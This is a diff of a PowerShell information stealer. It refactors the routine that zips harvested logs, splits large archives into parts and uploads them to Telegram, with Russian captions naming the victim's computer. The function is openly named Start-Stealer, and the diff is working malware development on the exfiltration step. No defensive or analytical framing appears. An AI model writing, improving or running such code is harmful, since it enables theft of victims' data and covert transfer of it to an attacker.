@@ -77,33 +77,39 @@ function Send-TelegramFile {
 }
 
 
-function Split-File {
+function Create-SplitArchive {
     param (
-        [string]$FilePath,
-        [int64]$MaxBytes = $MaxPartSize
+        [string]$SourcePath,
+        [string]$OutputZip,
+        [int64]$MaxPartSize = $MaxPartSize
     )
-    $buffsize = 8MB
-    $files = @()
-    $fs = [System.IO.File]::OpenRead($FilePath)
-    $part = 1
-    try {
-        while ($fs.Position -lt $fs.Length) {
-            $target = "$($FilePath)_part$part.zip"
-            $partStream = [System.IO.File]::Create($target)
-            $written = 0
-            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
-                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
-                $buffer = New-Object byte[] $toRead
-                $read = $fs.Read($buffer, 0, $toRead)
-                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read } else { break }
+
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $OutputZip, [System.IO.Compression.CompressionLevel]::Fastest, $false)
+
+    $size = (Get-Item $OutputZip).Length
+
+    if ($size -ge $MaxPartSize) {
+        $fs = [System.IO.File]::OpenRead($OutputZip)
+        $part = 1
+        $partFiles = @()
+        try {
+            while ($fs.Position -lt $fs.Length) {
+                $partName = "$($OutputZip -replace '\.zip$', '')_part$part.zip"
+                $bytesToRead = [Math]::Min($MaxPartSize, $fs.Length - $fs.Position)
+                $buffer = New-Object byte[] $bytesToRead
+                $fs.Read($buffer, 0, $bytesToRead) | Out-Null
+                [System.IO.File]::WriteAllBytes($partName, $buffer)
+                $partFiles += $partName
+                $part++
             }
-            $partStream.Close()
-            $files += $target
-            $part++
         }
+        finally { $fs.Close() }
+        Remove-Item $OutputZip -Force
+        return $partFiles
     }
-    finally { $fs.Close() }
-    return $files
+    return @($OutputZip)
 }
 
 function Start-Stealer {
@@ -157,23 +163,15 @@ function Start-Stealer {
 
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-        
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
+
+        $archiveFiles = Create-SplitArchive -SourcePath $LogFolder -OutputZip $ZipPath -MaxPartSize $MaxPartSize
 
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        $size = (Get-Item $ZipPath).Length
-
-        if ($size -ge $MaxPartSize) {
-            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
-            $i = 1
-            foreach ($partFile in $parts) {
-                Send-TelegramFile -FilePath $partFile -Caption "Лог part $i $(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') с устройства $env:COMPUTERNAME"
-                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
-                $i++
-            }
-        } else {
-            Send-TelegramFile -FilePath $ZipPath -Caption "Лог с устройства $env:COMPUTERNAME"
+        $i = 1
+        foreach ($archiveFile in $archiveFiles) {
+            Send-TelegramFile -FilePath $archiveFile -Caption "Лог $(if($archiveFiles.Count -gt 1){"part $i "})$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') с устройства $env:COMPUTERNAME"
+            Remove-Item $archiveFile -Force -ErrorAction SilentlyContinue
+            $i++
         }
     }
     catch {
